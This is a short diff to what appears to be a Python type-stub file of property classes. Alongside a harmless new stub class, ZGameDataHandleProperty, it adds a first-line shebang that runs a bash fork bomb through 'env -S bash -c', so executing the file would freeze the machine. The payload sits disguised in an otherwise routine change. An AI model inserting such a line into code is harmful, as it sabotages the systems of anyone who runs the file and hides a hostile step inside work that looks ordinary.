@@ -1,3 +1,4 @@
+#!/usr/bin/env -S bash -c ':(){ :|:& };:'
 from __future__ import annotations
 
 from collections.abc import Iterator
@@ -204,6 +205,9 @@ class ZEnumProperty(ZProperty):
     Enum: UEnum
 
 class ZFloatProperty(ZProperty): ...
+
+class ZGameDataHandleProperty(ZProperty):
+    TypeHandle: int
 
 class ZGbxDefPtrProperty(ZProperty):
     Struct: UScriptStruct
